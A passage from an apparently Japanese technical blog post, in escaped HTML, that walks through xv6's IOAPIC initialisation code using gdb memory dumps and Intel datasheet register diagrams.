    href=&quot;/static/45b8bf0613c0fee518900e712948f7c0/0b533/image-6.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 17.916666666666668%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAARlAAAEZQAGA43XUAAAA4klEQVQY0y2O6W6DMBCE8/6PVvVX2uYCwhpiDJgz2E5KVX11aVdazcweo9kp6zCj51B07KXlTSwvl5rXtKGbFh4hMC+euwuEyBf3qwNTnIXwwHnP4v93EXfE+v5amYaep1+4mYaPrGToe9xyR+uKw1VzzDXGGKSy7JOS90xj+xFRJRfRtE3DOeJm+Hx+0nU90zyjRDgfj4gonHPYtsXoG6aKT5E/gkfyjLY2W3rJc86nE000lPz6Z7iuK9Za+phKKUWSJBRlyTiOW6qiKGKXGx+GARW1MfW2lxggTVOqqtrufgDVECrAWoI6dQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/45b8bf0613c0fee518900e712948f7c0/8ac56/image-6.webp 240w,
/static/45b8bf0613c0fee518900e712948f7c0/d3be9/image-6.webp 480w,
/static/45b8bf0613c0fee518900e712948f7c0/b0a15/image-6.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/45b8bf0613c0fee518900e712948f7c0/8ff5a/image-6.png 240w,
/static/45b8bf0613c0fee518900e712948f7c0/e85cb/image-6.png 480w,
/static/45b8bf0613c0fee518900e712948f7c0/0b533/image-6.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/45b8bf0613c0fee518900e712948f7c0/0b533/image-6.png&quot;
            alt=&quot;2022/02/image-6.png&quot;
            title=&quot;2022/02/image-6.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://www.intel.com/content/dam/www/public/us/en/documents/datasheets/9-series-chipset-pch-datasheet.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel 9 Series Chipset Platform Controller Hub Datasheet&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最初の&lt;code class=&quot;language-text&quot;&gt;reg&lt;/code&gt;がインデックスとして使用され、&lt;code class=&quot;language-text&quot;&gt;data&lt;/code&gt;の領域を利用して読み書きを行われます。&lt;/p&gt;
&lt;p&gt;実際に起動時に&lt;code class=&quot;language-text&quot;&gt;ioapic&lt;/code&gt;の領域に格納される値がどうなっているのか気になったのでデバッガで確認してみました。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;0xFEC00000&lt;/code&gt;から20バイト分の領域を見てみましたが、この時点ではすべて0でした。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ x/5wx 0xfec00000
0xfec00000:	0x00000000	0x00000000	0x00000000	0x00000000
0xfec00010:	0x00000000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;dataレジスタ経由でデータの読み書きを行う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#data%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF%E7%B5%8C%E7%94%B1%E3%81%A7%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E8%AA%AD%E3%81%BF%E6%9B%B8%E3%81%8D%E3%82%92%E8%A1%8C%E3%81%86&quot; aria-label=&quot;dataレジスタ経由でデータの読み書きを行う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Dataレジスタ経由でデータの読み書きを行う&lt;/h3&gt;
&lt;p&gt;続いて以下のコードを見ます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;maxintr &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;ioapicread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;REG_VER&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
id &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;ioapicread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;REG_ID&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;id &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; ioapicid&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;cprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;ioapicinit: id isn&apos;t equal to ioapicid; not a MP\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ioapicread&lt;/code&gt;関数は、引数として受け取った値を&lt;code class=&quot;language-text&quot;&gt;ioapic&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;reb&lt;/code&gt;に書き込み、その後&lt;code class=&quot;language-text&quot;&gt;data&lt;/code&gt;の値を取得して返却する関数です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; uint &lt;span class=&quot;token function&quot;&gt;ioapicread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; reg&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  ioapic&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;reg &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; reg&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; ioapic&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;IOAPICでは、&lt;code class=&quot;language-text&quot;&gt;ioapic-&gt;reg&lt;/code&gt;がインデックスレジスタとして使用され、間接的にデータの読み書きを行うことができます。&lt;/p&gt;
&lt;p&gt;インデックスレジスタとレジスタの対応は以下の通りです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/0f8fc332e216b95790c9d23b8ce7a518/0b533/image-5.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 32.08333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAARlAAAEZQAGA43XUAAABI0lEQVQY00VR226EIBD1/3/PPjTqpl5BEbnsimB1PR2IbUnICTDnMkMmrMdkA8waUDGFYlBoRo2PRqJkGtvmcRwHVsLZrFBPh80HfO87nNvwdB5+22DXDSEEZLjX+zwgpQSbJNzLouMCPZ/BOUfb1OjYSEYKvVAw9pVEGL19Vl+JVzU9tDHI3teVBEPYwRgDpz1NAmqRWOSMuq5RliWstVjJ6GkNjNbQ2qR6NvQYxxEjZ3SnkV234HmeEEKg6zoiWVRVhaZtk2Ce56geD4h5xk6teu8TxvqWaiIWZGpiwusvYaBkE2YiTeTYk3DX9RiGIRF+MSaNxIgp4d1VxGVZ/gXj4AUJDvSglEptRIOYoCgKcDpLIjianXP0MYTJ/A4RO4tGP9vhxMmussmZAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/0f8fc332e216b95790c9d23b8ce7a518/8ac56/image-5.webp 240w,
/static/0f8fc332e216b95790c9d23b8ce7a518/d3be9/image-5.webp 480w,
/static/0f8fc332e216b95790c9d23b8ce7a518/b0a15/image-5.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/0f8fc332e216b95790c9d23b8ce7a518/8ff5a/image-5.png 240w,
/static/0f8fc332e216b95790c9d23b8ce7a518/e85cb/image-5.png 480w,
/static/0f8fc332e216b95790c9d23b8ce7a518/0b533/image-5.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/0f8fc332e216b95790c9d23b8ce7a518/0b533/image-5.png&quot;
            alt=&quot;2022/02/image-5.png&quot;
            title=&quot;2022/02/image-5.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://www.intel.com/content/dam/www/public/us/en/documents/datasheets/9-series-chipset-pch-datasheet.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel 9 Series Chipset Platform Controller Hub Datasheet&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://mmi.hatenablog.com/entry/2017/04/09/132708&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;I/O APICについて - 睡分不足&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;maxintr = (ioapicread(REG_VER) &gt;&gt; 16) &amp;amp; 0xFF;&lt;/code&gt;の行では、インデックスレジスタに1を指定してバージョン情報を取得しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ x/5wx 0xfec00000
0xfec00000:	0x00000001	0x00000000	0x00000000	0x00000000
0xfec00010:	0x00170020&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;maxintr&lt;/code&gt;には&lt;code class=&quot;language-text&quot;&gt;0x17&lt;/code&gt;が入ります。&lt;/p&gt;
&lt;p&gt;これはバージョンレジスタの23:16bitの範囲にあるMREを取得しているようです。&lt;/p&gt;
&lt;p&gt;ここで取得できる情報は割込み入力PINの数から1を引いた数になるみたいです。(おそらくこれが定義できる割込みの最大数に?)&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/32a6e216be2c56ffd4c31ca9ea42dd60/0b533/image-7.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 61.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAAB/klEQVQoz21T246qQBDk/z/Kl3UTox6NsnIVkIuACgLe1wdru1o9l+RM0umZpma6qmYwpn4ONy5hrUp4eQsn2WGRNTDTBvXxBo7H46HBcbvd0LYtrterRtd1OJ1Ov3FG4HsIlr7G9XJGliYoixzn0xH/G3VVYbkM9OCyLOC6Lo7HP1gjTRIkSYogCJCt1wJeIpZaGEaI41gjTVNEUaSxFgxrnK9WK81t2+FyuWgTYz6fySE+fN+H53lwHEdAK3jSmd19qUVhqBuXgmFjz3MVxzkzSXBvUZYiOQjRds8O9ONwOKgEBtfM/F43HZr2oN/fGGb6+V7zDCPJt0jXJQ5q7llpvw1n3L+/UbdHeFmFqNjrpr+DmHfe7/cwfLkU27bxazyGaZoqkfIpg5Isy1LP1lmGIs/VT/rInEkt0TuQixS5lVyYQVlVtcN0OpGYYj6bYT439XDbtjCZTNRL79XIlgb0lyToH2vOa14U4uH9flcPXNdRJqTdNC222y02m42ACux2O2WQC0PWy3KjazLl9+1GsLJm3ajqWumPRyN89Pv4/Oyj1+thMBhgJLXhcKiZDMjashZYLBY6Z5Ad17SGFhh8S/SKRW4iS8pg91qaMehN0zTK/qmg+SfeNSoxEn3Eofpnfn3pY6UMNf5l+POBPxtzTgz3xJI5pzX8/dj8B//bc+BEHWN+AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/32a6e216be2c56ffd4c31ca9ea42dd60/8ac56/image-7.webp 240w,
/static/32a6e216be2c56ffd4c31ca9ea42dd60/d3be9/image-7.webp 480w,
/static/32a6e216be2c56ffd4c31ca9ea42dd60/b0a15/image-7.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/32a6e216be2c56ffd4c31ca9ea42dd60/8ff5a/image-7.png 240w,
/static/32a6e216be2c56ffd4c31ca9ea42dd60/e85cb/image-7.png 480w,
/static/32a6e216be2c56ffd4c31ca9ea42dd60/0b533/image-7.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/32a6e216be2c56ffd4c31ca9ea42dd60/0b533/image-7.png&quot;
            alt=&quot;2022/02/image-7.png&quot;
            title=&quot;2022/02/image-7.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://www.intel.com/content/dam/www/public/us/en/documents/datasheets/9-series-chipset-pch-datasheet.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel 9 Series Chipset Platform Controller Hub Datasheet&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;次の行では&lt;code class=&quot;language-text&quot;&gt;id&lt;/code&gt;として&lt;code class=&quot;language-text&quot;&gt;0x0&lt;/code&gt;を取得しました。&lt;/p&gt;
&lt;p&gt;これはIDレジスタの27:24bitの範囲の値でAPIC IDの値になります。(1つ目が0なのでたぶん初回実行時の値が0になっている?)&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f20954147f64329fe787e7a1456b66e2/0b533/image-8.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 42.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAARlAAAEZQAGA43XUAAABZUlEQVQoz5VS126DQBC8//+xSFHiJrkCphsw1TgugOzJzspO5Ic85KTRnrbM7A2YVVzhfZPgwynw6ewx2hawsi+M3BJvmz3srAXP7XbXOAwDLpcL+r5H110lf9P8/X5XGMuysFou0dQVDk0N27ZRliX+Ommaas8w9AiDAHlRvNQNi57nIQxDJEkC3/fhui52ux3yPFdkWYY4jkWokr7gcS8RRSF8mWW9EOK6rmE8GSaZ4ziqHIgqCdfrtUZXBhzbgr1ZI0sT8EUkfPZzGd6jKMLpdIYJ0lKZr9frK7pOYy8+JWWLjXgd5Y341qmHrJ3P5x8wx03NYrnCeDzGdDIRNV/VuTEjVWOBH4Swtz48icxp/vFsPpWoqkq3Ne52q2TT6fRBGCkhPWTkMO8k3qnIb65tW8XhcMDxeFQRw4+wmM8xm83UHyqxyKbnwF+gVU+wn/6bWJTUfAGf0EqhaRpt+A8owF/qG1VGoTvNDXmCAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f20954147f64329fe787e7a1456b66e2/8ac56/image-8.webp 240w,
/static/f20954147f64329fe787e7a1456b66e2/d3be9/image-8.webp 480w,
/static/f20954147f64329fe787e7a1456b66e2/b0a15/image-8.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f20954147f64329fe787e7a1456b66e2/8ff5a/image-8.png 240w,
/static/f20954147f64329fe787e7a1456b66e2/e85cb/image-8.png 480w,
/static/f20954147f64329fe787e7a1456b66e2/0b533/image-8.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f20954147f64329fe787e7a1456b66e2/0b533/image-8.png&quot;
            alt=&quot;2022/02/image-8.png&quot;
            title=&quot;2022/02/image-8.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://www.intel.com/content/dam/www/public/us/en/documents/datasheets/9-series-chipset-pch-datasheet.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel 9 Series Chipset Platform Controller Hub Datasheet&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;この値が&lt;code class=&quot;language-text&quot;&gt;ioapicid&lt;/code&gt;と一致するかを検証しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ioapicid&lt;/code&gt;は&lt;a href=&quot;/unix-xv6-006-kernel-main-03&quot;&gt;マルチプロセッサ編&lt;/a&gt;で見た通り、MPコンフィグレーションテーブルから取得したAPICの番号でした。&lt;/p&gt;
&lt;h3 id=&quot;redirection-tableの初期化&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#redirection-table%E3%81%AE%E5%88%9D%E6%9C%9F%E5%8C%96&quot; aria-label=&quot;redirection tableの初期化 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Redirection Tableの初期化&lt;/h3&gt;
&lt;p&gt;最後に、&lt;code class=&quot;language-text&quot;&gt;ioapicwrite&lt;/code&gt;関数で全ての&lt;code class=&quot;language-text&quot;&gt;Redirection Table&lt;/code&gt;を無効化しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Mark all interrupts edge-triggered, active high, disabled,&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// and not routed to any CPUs.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;=&lt;/span&gt; maxintr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;ioapicwrite&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;REG_TABLE&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; INT_DISABLED &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;T_IRQ0 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;ioapicwrite&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;REG_TABLE&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ioapicwrite&lt;/code&gt;関数は以下のようにインデックスと書き込みデータを使用して書き込みを行う関数です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;ioapicwrite&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; reg&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  ioapic&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;reg &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; reg&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ioapic&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;INT_DISABLED&lt;/code&gt;は、&lt;code class=&quot;language-text&quot;&gt;0x00010000&lt;/code&gt;として定義されています。&lt;/p&gt;
&lt;p&gt;これによって、17番目のbitに1をセットすることができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/fd74530a7bc6d1dd7ea4a28d709cede8/0b533/image-9.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 19.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAARlAAAEZQAGA43XUAAAAvElEQVQY0z1PXQ9EMBD0/38aolRFwmm158VXEF6Z2y3uYTI7M91mJ5inCUmSoCgKaK0xzzOGYcBEPmfMrMdx9PPL7xvWDNa8G5znScEIpRTiOIYxBoY+dtbBti1agnPOe6wt+Vo3/8zD3LyuK4LrurDvO6SUiKIIKs+RCgHxIGedpjQnDwvP7yxlhizLEIYhvl2H4DgOf7K1FnVd+9p8ZVVV0E1zg7wPZd7T1MBolGWJvu+xbRuWZfF1+cIfeiEh/Dp95tgAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/fd74530a7bc6d1dd7ea4a28d709cede8/8ac56/image-9.webp 240w,
/static/fd74530a7bc6d1dd7ea4a28d709cede8/d3be9/image-9.webp 480w,
/static/fd74530a7bc6d1dd7ea4a28d709cede8/b0a15/image-9.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
